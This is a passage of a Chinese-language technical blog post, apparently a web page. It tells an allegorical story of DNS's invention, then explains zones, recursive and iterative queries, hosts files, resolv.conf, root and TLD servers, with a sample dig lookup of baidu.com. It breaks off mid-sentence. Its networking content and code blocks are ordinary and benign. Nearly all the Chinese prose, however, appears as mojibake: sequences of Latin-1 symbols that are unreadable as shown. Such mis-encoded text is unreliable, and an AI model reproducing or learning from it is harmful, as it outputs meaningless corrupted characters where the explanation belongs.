ï¼šå¤©æ‰å°‘å¹´çš„çµæ„Ÿ</strong></h2><p>ä¸€å¤©ï¼Œé•‡ä¸Šçš„å¹´è½»å·¥ç¨‹å¸ˆ<strong>ä¿ç½—Â·è«å¡ä½©ç‰¹é‡Œæ–¯</strong>ï¼ˆPaul Mockapetrisï¼‰åœ¨é…’é¦†å–é…’ï¼Œå¬åˆ°æœ‰äººæŠ±æ€¨ï¼šâ€œè¦æ˜¯ç”µè¯ç°¿èƒ½è‡ªåŠ¨æ›´æ–°ï¼Œè¿˜èƒ½åˆ†åŒºåŸŸç®¡ç†å°±å¥½äº†ï¼â€<br>ä»–çµå…‰ä¸€é—ªï¼Œæå‡ºä¸€å¼ çš±å·´å·´çš„è‰çº¸ï¼Œç”»ä¸‹äº†ä¸€ä¸ª<strong>åˆ†å±‚åœ°å€ç³»ç»Ÿ</strong>çš„è®¾è®¡å›¾ï¼š</p><ol><li><strong>æ€»æœºï¼ˆæ ¹æœåŠ¡å™¨ï¼‰</strong>ï¼šåªè®°å½•æ¯ä¸ªâ€œå¤§åŒºâ€çš„æ¥çº¿å‘˜æ˜¯è°ã€‚</li><li><strong>åŒºåŸŸåˆ†æœºï¼ˆé¡¶çº§åŸŸæœåŠ¡å™¨ï¼‰</strong>ï¼šæ¯”å¦‚ <code>.com</code> åŒºã€<code>.edu</code> åŒºï¼Œè´Ÿè´£ç®¡ç†ä¸‹å±è¡—é“ã€‚</li><li><strong>è¡—é“åˆ†æœºï¼ˆæƒå¨æœåŠ¡å™¨ï¼‰</strong>ï¼šç›´æ¥ä¿ç®¡æ¯æˆ·äººå®¶çš„æœ€æ–°åœ°å€ã€‚</li></ol><p>ä»–å…´å¥‹åœ°å¤§å–Šï¼šâ€œä¸å†éœ€è¦ä¸€æœ¬å¤§ä¹¦ï¼é—®è·¯çš„äººæŒ‰å±‚çº§æŸ¥è¯¢ï¼Œå°±åƒæ‰“ç”µè¯è½¬æ¥åˆ†æœºï¼â€</p><hr><h2 id="ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ"><a href="#ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ"></a><strong>ç¬¬ä¸‰ç« ï¼šDNSç³»ç»Ÿçš„è¯ç”Ÿ</strong></h2><p>ä¿ç½—è¿å¤œè¯´æœé•‡é•¿ï¼ˆäº’è”ç½‘å·¥ç¨‹ç»„IETFï¼‰ï¼Œåœ¨å°é•‡è¯•ç‚¹æ–°ç³»ç»Ÿâ€”â€”<strong>DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰</strong>ã€‚</p><ul><li><strong>åŸŸå</strong>ï¼šæ¯æˆ·äººå®¶æœ‰äº†æ˜“è®°çš„åå­—ï¼Œæ¯”å¦‚ <code>é¢åŒ…åº—.example.com</code>ã€‚</li><li><strong>è§£ææµç¨‹</strong>ï¼š<ol><li>å±…æ°‘é—®æ€»æœºï¼šâ€œ<code>.com</code> åŒºè°ç®¡ï¼Ÿâ€</li><li>æ€»æœºå›ç­”ï¼šâ€œå»é—® <code>.com</code> åŒºåˆ†æœºï¼â€</li><li><code>.com</code> åŒºåˆ†æœºè¯´ï¼šâ€œ<code>example.com</code> è¡—é“å½’ä¿ç½—å®¶çš„æœåŠ¡å™¨ç®¡ï¼â€</li><li>æœ€ç»ˆï¼Œä¿ç½—å®¶çš„æœåŠ¡å™¨ç»™å‡ºâ€œé¢åŒ…åº—â€çš„IPåœ°å€ï¼š<code>192.0.2.1</code>ã€‚</li></ol></li></ul><p><strong>å¥‡è¿¹å‘ç”Ÿäº†</strong>ï¼š</p><ul><li>åœ°å€ç°¿è‡ªåŠ¨æ›´æ–°ï¼Œå†ä¹Ÿä¸ç”¨å…¨é•‡æ´¾é€ï¼</li><li>æŸ¥è¯¢é€Ÿåº¦å¿«å¦‚é—ªç”µï¼Œè¿·è·¯çš„äººè¶Šæ¥è¶Šå°‘ã€‚</li><li>å°é•‡æ‰©å¼ æˆè¶…çº§åŸå¸‚ï¼ˆäº’è”ç½‘ï¼‰ï¼ŒDNSæˆäº†çœ‹ä¸è§çš„â€œå¯¼èˆªå‘˜â€ã€‚</li></ul><hr><h2 id="å°¾å£°ï¼šå°é•‡çš„é—äº§"><a href="#å°¾å£°ï¼šå°é•‡çš„é—äº§" class="headerlink" title="å°¾å£°ï¼šå°é•‡çš„é—äº§"></a><strong>å°¾å£°ï¼šå°é•‡çš„é—äº§</strong></h2><p>å¤šå¹´åï¼Œé˜¿å¸•é•‡æˆäº†å…¨çƒäº’è”ç½‘ï¼ŒDNSç³»ç»Ÿé»˜é»˜æ”¯æ’‘ç€äº¿ä¸‡æ¬¡æŸ¥è¯¢ã€‚</p><ul><li><strong>æ ¹æœåŠ¡å™¨</strong>åƒå®ˆæŠ¤ç¥ï¼Œå…¨çƒä»…æœ‰13ç»„ï¼ˆé•œåƒéå¸ƒå„åœ°ï¼‰ã€‚</li><li><strong>å±‚çº§ç®¡ç†</strong>è®©æ¯ä¸ªç¤¾åŒºï¼ˆåŸŸåï¼‰è‡ªæ²»ï¼Œæ— éœ€ä¸­å¤®é›†æƒã€‚</li><li>ä¿ç½—çš„åå­—è¢«åˆ»åœ¨â€œäº’è”ç½‘åäººå ‚â€ï¼Œè€Œé‚£æœ¬æ—§ç”µè¯ç°¿ï¼Œæˆäº†åšç‰©é¦†é‡Œçš„å¤è‘£ã€‚</li></ul><hr><h2 id="éšå–»è§£è¯»"><a href="#éšå–»è§£è¯»" class="headerlink" title="éšå–»è§£è¯»"></a><strong>éšå–»è§£è¯»</strong></h2><ul><li><strong>ç”µè¯ç°¿</strong> <code>hosts.txt</code> â†’ æ—©æœŸé™æ€ä¸»æœºæ–‡ä»¶</li><li><strong>æ€»æœºâ†’åŒºåŸŸåˆ†æœºâ†’è¡—é“åˆ†æœº</strong> â†’ DNSæ ¹æœåŠ¡å™¨â†’é¡¶çº§åŸŸâ†’æƒå¨æœåŠ¡å™¨</li><li><strong>éª‘é©¬é€ä¹¦</strong> â†’ æ‰‹åŠ¨æ›´æ–°ä¸»æœºæ–‡ä»¶çš„ä½æ•ˆ</li><li><strong>åˆ†å±‚æŸ¥è¯¢</strong> â†’ DNSé€’å½’&#x2F;è¿­ä»£è§£ææµç¨‹</li></ul><p>åœ¨æ—©æœŸè®¡ç®—æœºç³»ç»Ÿçš„é€šä¿¡ä¸ä¾¿ä¸‹ï¼Œè¿™ä¾¿æˆå°±äº†DNS</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="åŒºåŸŸ"><a href="#åŒºåŸŸ" class="headerlink" title="åŒºåŸŸ"></a>åŒºåŸŸ</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200914104025076.png" alt="20200914104025076"></p><p>å…¶ä¸­é¡¶çº§åŸŸï¼ˆTLDï¼‰æœ‰ <code>arpa</code>ã€<code>com</code>ã€<code>edu</code>ã€<code>gov</code>â€¦</p><p>é¡¶çº§åŸŸåˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š</p><ol><li><code>gTLDs</code>: <code>.com</code>ã€<code>.org</code> ç­‰å«åš<code>ä¸€èˆ¬é€šç”¨é¡¶çº§åŸŸ</code></li><li><code>ccTLDs</code>: <code>.cn</code>ã€<code>.jp</code> ç­‰å«åš<code>å›½å®¶é¡¶çº§åŸŸ</code></li><li><code>arpa</code>ï¼šç‰¹æ®ŠåŸŸï¼Œæ¯”è¾ƒç‰¹æ®Šæ”¾åœ¨ä¸‹é¢è®²</li></ol><p>ä¸€ä¸ª DNS å­æ ‘ï¼ˆç‹¬ç«‹ç®¡ç†çš„ï¼‰å°±ç§°ä¸ºä¸€ä¸ª<code>åŒºåŸŸ</code>ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ <code>sina.com.cn</code> è¿™ä¸ªäºŒçº§åŸŸï¼Œå¯ä»¥å°†å®ƒçš„åŒºåŸŸåˆ’åˆ†ä¸ºæ›´å°çš„åŒºåŸŸï¼Œæ¯”å¦‚ä¸€èˆ¬ä¼šæ ¹æ®ç”¨é€”æ¥åˆ’åˆ†åŒºåŸŸï¼Œå‡è®¾ <code>blog.sina.com.cn</code> ä¸ºåšå®¢ç›¸å…³çš„åŸŸåç­‰ç­‰ã€‚åˆ’åˆ†å®Œå­åŒºåŸŸä¹‹åï¼Œéœ€è¦ç»è¿‡çˆ¶åŒºåŸŸçš„æˆæƒï¼Œè¿™æ ·çˆ¶åŒºåŸŸé‡åˆ°å±äºå­åŒºåŸŸä¸‹çš„åŸŸåï¼Œå°±ä¼šè½¬ç»™å­åŒºåŸŸæ¥è§£æã€‚</p><h3 id="æŸ¥è¯¢æ–¹å¼"><a href="#æŸ¥è¯¢æ–¹å¼" class="headerlink" title="æŸ¥è¯¢æ–¹å¼"></a>æŸ¥è¯¢æ–¹å¼</h3><p>åœ¨è¯´æµç¨‹ä¹‹å‰ï¼Œå…ˆè¯´ä¸€ä¸‹æŸ¥è¯¢æ–¹å¼ã€‚å¾ˆç®€å•ï¼Œåˆ†ä¸º 2 ç§ï¼š</p><ol><li>é€’å½’æŸ¥è¯¢ï¼šA -&gt; B -&gt; Cï¼ŒA å‘ B å‘èµ· DNS è§£æçš„è¯·æ±‚ä¹‹åï¼ŒB å¸® A å» C é‚£é‡ŒæŸ¥æ‰¾ï¼Œæ‹¿åˆ°ç»“æœä¹‹åè¿”å›ç»™ Aï¼Œè¿™ä¸ªæ—¶å€™ Aã€B å„å‘èµ·äº†ä¸€æ¬¡è§£æè¯·æ±‚ã€‚</li><li>è¿­ä»£æŸ¥è¯¢ï¼šA -&gt; B, A -&gt; Cï¼ŒA å‘ B å‘èµ· DNS è§£æçš„è¯·æ±‚ä¹‹åï¼ŒB å‘Šè¯‰ A è¦å» C é‚£é‡ŒæŸ¥æ‰¾ï¼ŒA å†å‘ C å‘èµ· DNS è§£æè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™ A ä¸€å…±å‘èµ·äº†ä¸¤æ¬¡è§£æè¯·æ±‚ï¼ŒB æ²¡æœ‰å‘èµ· DNS è§£æè¯·æ±‚ã€‚</li></ol><h2 id="Hosts-æ–‡ä»¶ï¼ˆé™æ€-DNS-æœåŠ¡å™¨ï¼‰"><a href="#Hosts-æ–‡ä»¶ï¼ˆé™æ€-DNS-æœåŠ¡å™¨ï¼‰" class="headerlink" title="Hosts æ–‡ä»¶ï¼ˆé™æ€ DNS æœåŠ¡å™¨ï¼‰"></a>Hosts æ–‡ä»¶ï¼ˆé™æ€ DNS æœåŠ¡å™¨ï¼‰</h2><p>åœ¨windowsä¸‹çš„hostsæ–‡ä»¶å­˜æ”¾åœ¨<code>C:\Windows\System32\drivers\etc\hosts</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="hljs-comment"># entry should be kept on an individual line. The IP address should</span><br><span class="hljs-comment"># be placed in the first column followed by the corresponding host name.</span><br><span class="hljs-comment"># The IP address and the host name should be separated by at least one</span><br><span class="hljs-comment"># space.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="hljs-comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="hljs-comment">#       38.25.63.10     x.acme.com              # x client host</span><br><br><span class="hljs-comment"># localhost name resolution is handled within DNS itself.</span><br><span class="hljs-comment">#127.0.0.1       localhost</span><br><span class="hljs-comment">#::1             localhost</span><br><span class="hljs-comment"># Added by Docker Desktop</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> host.docker.internal<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> gateway.docker.internal<br><span class="hljs-comment"># To allow the same kube context to work on the host and the container:</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> kubernetes.docker.internal<br><span class="hljs-comment"># End of section</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br></code></pre></td></tr></table></figure><p>åœ¨linuxä¸‹å¯ä»¥è®¿é—®&#x2F;etc&#x2F;hostsæŸ¥çœ‹</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> cat /etc/hosts<br><span class="hljs-comment"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf: #ä½¿ç”¨çš„æ˜¯wslå­ç³»ç»Ÿ</span><br><span class="hljs-comment"># [network]</span><br><span class="hljs-comment"># generateHosts = false</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>       localhost<br><span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span>       <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span>.        <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span><br><br><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span><br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§<code>127.0.01</code>è¢«æ˜ å°„åˆ°<code>localhost</code> å…¶å®è®¿é—®<code>127.0.0.1</code>å°±æ˜¯åœ¨æˆ¿è®¿é—®<code>localhost</code></p><p>Hosts æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ç†è§£ä¸ºæ˜¯æœ¬åœ°é™æ€çš„ DNS æœåŠ¡å™¨ã€‚éœ€è¦è§£æ DNS çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä» Hosts æ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„ ip-åŸŸå æ˜ å°„å…³ç³»ï¼Œä¸€æ—¦æ‰¾åˆ°é‚£ä¹ˆå°±å®Œæˆè§£æäº†ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç»§ç»­è§£ææµç¨‹ã€‚ä¼˜å…ˆçº§é«˜äºç½‘ç»œDNSè§£ææœåŠ¡ï¼Œæ‰€æœ‰å¯ä»¥åŠ å¿«åŸŸåè§£æã€å±è”½åƒåœ¾ç½‘ç«™ã€å¹¿å‘Šç­‰ç­‰</p><h2 id="LocalDNS-æœåŠ¡å™¨"><a href="#LocalDNS-æœåŠ¡å™¨" class="headerlink" title="LocalDNS æœåŠ¡å™¨"></a>LocalDNS æœåŠ¡å™¨</h2><p>è‹¥ Hosts æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸å…³åŸŸåçš„è®°å½•ï¼Œåˆ™æ¥åˆ°äº† LocalDNSã€‚</p><p>åœ¨windowsä¸­ï¼Œå¦‚æœ <code>hosts</code> æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸å…³åŸŸåçš„è®°å½•ï¼Œç³»ç»Ÿä¼šä¾èµ–æœ¬åœ°ç½‘ç»œé…ç½®ä¸­çš„ DNS æœåŠ¡å™¨è¿›è¡ŒåŸŸåè§£æã€‚Windows çš„æœ¬åœ° DNS é…ç½®å­˜å‚¨åœ¨ <strong>ç½‘ç»œé€‚é…å™¨çš„è®¾ç½®ä¸­</strong>æ— æ³•å…·ä½“å‘ˆç°ï¼Œ</p><p>ä½†æ˜¯åœ¨linuxä¸­å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼š<code>/etc/resolv.conf</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span><br># This <span class="hljs-keyword">file</span> was automatically generated by WSL. To <span class="hljs-keyword">stop</span> automatic generation of this <span class="hljs-keyword">file</span>, <span class="hljs-built_in">add</span> the following entry <span class="hljs-keyword">to</span> /etc/wsl.<span class="hljs-keyword">conf</span>:<br># [network]<br># generateResolvConf = false<br>nameserver <span class="hljs-number">10</span>.xxx.xxx.xxx<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä»€ä¹ˆæ—¶å€™ç”Ÿæˆçš„å‘¢ï¼ŸDHCP(åŠ¨æ€ä¸»æœºé…ç½®åè®®) çš„æ—¶å€™ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œçš„ ip ç»å¸¸æ˜¯å†…ç½‘ ipï¼Œå¹¶ä¸” LocalDNS é‡Œé¢æœ‰ä¸ª â€œlocalâ€ï¼Œå¤§å®¶å¯èƒ½ä¼šè®¤ä¸º LocalDNS çš„æœåŠ¡å™¨ ip éƒ½æ˜¯å†…ç½‘ ipï¼Œå®é™…ä¸Šä¹Ÿå¯ä»¥æ˜¯å¤–ç½‘ ipï¼Œæ¯”å¦‚å…¶ä»–ç»„ç»‡æä¾›çš„ DNSï¼Œåƒè°·æ­Œçš„<code>8.8.8.8</code>å•¦ï¼Œå›½å†…çš„<code>114.114.114.114</code>å•¦ã€‚ä¸ªäººæ„Ÿè§‰æ˜¯è¿™äº› DNS çš„åœ°å€å¡«å†™åœ¨æˆ‘ä»¬æœ¬åœ°çš„ç”µè„‘æˆ–è€…ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œæ‰€ä»¥ç§°ä¸º LocalDNS</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒLocalDNS æœ¬èº«ä¸å…·å¤‡çœŸæ­£çš„è§£æåŸŸåçš„åŠŸèƒ½ã€‚å®ƒçš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼š</p><ol><li>ä»£æ›¿ç”¨æˆ·çš„è®¾å¤‡å‚ä¸åŸŸåè§£æ</li><li>ç¼“å­˜åŸŸåçš„æŸ¥è¯¢è®°å½•ï¼Œå½“å…¶ä»–è®¾å¤‡å‘èµ·ç›¸åŒçš„åŸŸåæŸ¥è¯¢è¯·æ±‚æ—¶å¯ä»¥ç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœï¼Œå¯ä»¥åŠ å¿«åŸŸåæŸ¥è¯¢é€Ÿåº¦ã€‚</li></ol><p>ç”¨æˆ·è®¾å¤‡ -&gt;æ£€æŸ¥hostsæ–‡ä»¶-&gt; LocalDNS ä¸€èˆ¬æ˜¯é€’å½’æŸ¥è¯¢ï¼Œè€Œ LocalDNS å‘ç°å®ƒè‡ªå·±æ²¡æœ‰ç¼“å­˜å¯¹åº”çš„æ•°æ®åï¼Œåˆ™éœ€è¦å‘ DNS æ ¹æœåŠ¡å™¨å‘èµ·æŸ¥è¯¢è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ï¼Œä¸€èˆ¬æ˜¯è¿­ä»£æŸ¥è¯¢ã€‚æ‰€ä»¥ä»»ä½• LocalDNS éƒ½éœ€çŸ¥é“ DNS æ ¹æœåŠ¡å™¨çš„ ip åœ°å€ã€‚</p><h2 id="DNS-æ ¹æœåŠ¡å™¨"><a href="#DNS-æ ¹æœåŠ¡å™¨" class="headerlink" title="DNS æ ¹æœåŠ¡å™¨"></a>DNS æ ¹æœåŠ¡å™¨</h2><p>DNS æ ¹æœåŠ¡å™¨ï¼ˆroot name serverï¼‰ï¼Œå…¨çƒåªæœ‰ <code>13</code> ä¸ªï¼Œç¼–å·ä» <code>a.root-servers.net</code> ä¸€ç›´åˆ° <code>m.root-servers.net</code>ã€‚ä¹‹æ‰€ä»¥ä¸è¯´ 13 å°ï¼Œæ˜¯å› ä¸ºæ¯ä¸ª DNS æ ¹èŠ‚ç‚¹éƒ½ä¼šæœ‰å¤šä¸ªæœåŠ¡å™¨è´Ÿè´£å‡è¡¡æŸ¥è¯¢ï¼ˆå³ä»»æ’­èŠ‚ç‚¹ï¼‰ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æŸ¥è¯¢ï¼š<a href="https://root-servers.org/">https://root-servers.org/</a> ã€‚</p><p>ç°åœ¨è§£æ DNS çš„æ—¶å€™ï¼Œå·²ç»ä¸å†éœ€è¦çŸ¥é“ DNS æ ¹æœåŠ¡å™¨çš„çœŸæ­£çš„ ip åœ°å€ï¼Œåªéœ€è¦çŸ¥é“ä»»æ’­èŠ‚ç‚¹çš„ipåœ°å€å°±å¯ä»¥åœ¨ä¸–ç•Œå„åœ°ä¸å½“åœ°çš„æœ€ä¼˜èŠ‚ç‚¹è¿›è¡Œé€šä¿¡äº†ï¼Œæ‰€ä»¥ç°åœ¨å¤§å¤šæ•°çš„ DNS æ ¹æœåŠ¡å™¨çš„ ip åœ°å€éƒ½æ˜¯ä»»æ’­èŠ‚ç‚¹ çš„ ip åœ°å€ã€‚è¿™æ ·é€Ÿåº¦æœ€å¿«</p><p>æ‰€ä»¥ï¼ŒDNS æ ¹æœåŠ¡å™¨æŒç®¡ç€æ‰€æœ‰ <code>DNS é¡¶çº§åŸŸåæœåŠ¡å™¨</code> çš„åœ°å€ï¼Œæ¯”å¦‚å¤§å®¶ç†Ÿæ‚‰çš„ <code>.com</code>ã€<code>.org</code>ã€<code>.edu</code> ç­‰ç­‰ã€‚å‡å¦‚æˆ‘ä»¬æŸ¥è¯¢çš„é¡¶çº§åŸŸåæ˜¯ <code>.com</code>ï¼ŒDNS æ ¹æœåŠ¡å™¨ä¼šå°†<code>.com</code> é¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€å‘å›ç»™ LocalDNS æœåŠ¡å™¨ï¼Œè®©å®ƒè‡ªå·±å»é‚£é‡ŒæŸ¥ã€‚äºæ˜¯ LocalDNS æœåŠ¡å™¨å†å‘æ‰‹æ¡ <code>.com</code> çš„ DNS é¡¶çº§åŸŸåæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢</p><h2 id="DNS-é¡¶çº§åŸŸåæœåŠ¡å™¨"><a href="#DNS-é¡¶çº§åŸŸåæœåŠ¡å™¨" class="headerlink" title="DNS é¡¶çº§åŸŸåæœåŠ¡å™¨"></a>DNS é¡¶çº§åŸŸåæœåŠ¡å™¨</h2><p>æ‰‹æ¡ <code>.com</code> çš„ DNS é¡¶çº§åŸŸåæœåŠ¡å™¨ä¸€çœ‹æ¥æºçš„æŸ¥è¯¢æ˜¯ <code>xxx.com</code>ï¼ŒæŒ‰ç†æ¥è¯´åº”è¯¥å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ ip å¹¶ç›´æ¥è¿”å›äº†ã€‚ä½†æ˜¯ç°åœ¨åŸºæœ¬ä¸Šéƒ½æ˜¯æˆæƒç»™å…¶ä»–å‚å®¶å»åšçš„ï¼Œè¢«æˆæƒçš„å«<code>DNS æƒå¨åŸŸåæœåŠ¡å™¨</code>ï¼Œæˆ–è€…ä¼ä¸šè‡ªå»ºçš„ DNS æœåŠ¡å™¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè§£æä¸€ä¸‹<code>baidu.com</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">~$ dig baidu.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.24.04.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 46978</span><br><span class="hljs-string">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; MBZ: 0x0001, udp: 1232</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.                     IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.              1       IN      A       198.18.0.6</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 0 msec</span><br><span class="hljs-string">;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)</span><br><span class="hljs-string">;; WHEN: Mon Jan 27 18:59:34 CST 2025</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 54</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¡¨ç¤ºæŸ¥è¯¢é¦–å…ˆç»è¿‡äº†<code>10.255.255.254</code>ï¼ˆæœ¬åœ°çš„localDNSï¼‰è®¾ç½®çš„DNSè§£æåœ°å€,å¦‚æœæœ¬åœ°æ²¡æœ‰å¯¹åº”çš„ç¼“å­˜è®°å½•,ä»–å°±ä¼šå‘èµ·é€’å½’æŸ¥è¯¢ï¼Œé¦–å…ˆå‘<strong>æœ€è¿‘çš„ä¼ æ’­èŠ‚ç‚¹</strong>æŸ¥è¯¢<code>baidu.com</code>çš„é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼ˆ<code>.com</code> çš„æƒå¨æœåŠ¡å™¨ï¼‰ã€‚èŠ‚ç‚¹ä¼šè¿”å› <code>.com</code> çš„æƒå¨æœåŠ¡å™¨åœ°å€ã€‚LocalDNS å†å‘ <code>.com</code> çš„æƒå¨æœåŠ¡å™¨æŸ¥è¯¢ <code>baidu.com</code> çš„æƒå¨æœåŠ¡å™¨ã€‚<code>.com</code> çš„æƒå¨æœåŠ¡å™¨è¿”å› <code>baidu.com</code> çš„æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€,LocalDNS æœ€ç»ˆå‘ <code>dns.baidu.com</code> æŸ¥è¯¢ï¼Œè·å–åˆ°å®é™…çš„ipåœ°å€ï¼Œ</p><p>è¿™ä¸ªæ—¶å€™ LocalDNS æœåŠ¡å™¨å°±ä¼šç¼“å­˜ <code>baidu.com</code> çš„ DNS æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œå…å¾—ä¸‹æ¬¡æŸ¥çš„æ—¶å€™è¿˜å¾—å†èµ°ä¸€éä¹‹å‰çš„æµç¨‹ï¼ˆå½“ç„¶æ˜¯åœ¨ç¼“å­˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼‰ã€‚</p><h2 id="DNS-æƒå¨åŸŸåæœåŠ¡å™¨"><a href="#DNS-æƒå¨åŸŸåæœåŠ¡å™¨" class="headerlink" title="DNS æƒå¨åŸŸåæœåŠ¡å™¨"></a>DNS æƒå¨åŸŸåæœåŠ¡å™¨</h2><p>DNS æƒå¨åŸŸåæœåŠ¡å™¨è¦æå‰ç”³è¯· DNS è§£ææˆæƒï¼Œè¿™ç±» DNS åŸŸåæœåŠ¡å™¨ä¸€èˆ¬æŒç®¡ç€ç‰¹å®šåŸŸä¸‹æ‰€æœ‰çš„å­åŸŸå’Œä¸»æœºï¼Œæ¯”å¦‚å®ƒä¸ä»…çŸ¥é“ <code>baidu.com</code> çš„ ipï¼ŒåŒæ ·ä¹ŸçŸ¥é“ <code>www.baidu.com</code> çš„ ipã€‚æ‰€ä»¥å®ƒå¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼Œè¿™ä¸€æ­¥æ²¡å•¥å¥½è¯´çš„ã€‚</p><p>åŒæ ·ï¼Œ LocalDNS 